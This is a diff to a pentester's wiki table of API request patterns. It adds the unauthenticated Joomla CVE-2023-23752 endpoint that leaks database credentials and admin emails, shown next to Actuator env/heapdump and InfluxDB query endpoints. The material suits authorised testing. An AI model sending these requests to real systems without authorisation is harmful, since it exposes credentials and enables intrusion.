@@ -23,6 +23,9 @@ Reusable API request patterns that have produced findings. Product/tech + the re
 | InfluxDB 1.x | `/query?q=SHOW+DATABASES` | GET | - | often none | DB enum; `/query?q=` arbitrary InfluxQL |
 | Actuator (Spring) | `/actuator/env`, `/actuator/heapdump` | GET | - | often none | secrets/creds in env or heap |
 | Swagger / OpenAPI | `/swagger.json`, `/openapi.json`, `/v3/api-docs` | GET | - | none | full endpoint map -> hidden APIs |
+| Joomla 4.0.0-4.2.7 | `/api/index.php/v1/config/application?public=true` | GET | needs `Accept: */*` (else 406 Not Acceptable) | none - CVE-2023-23752 | DB host/user/password + dbprefix; `/api/index.php/v1/users?public=true` leaks Super-User names/emails |
 
 ## How to extend
 When a request pattern yields a finding on an engagement, add the **generic** form here (product, endpoint shape, payload, impact). Strip client host/path specifics. Cross-link the relevant technique page (e.g. [[supabase-attacks]], [[graphql]]).
+
+<!-- promoted-slug: joomla-cve-2023-23752 -->
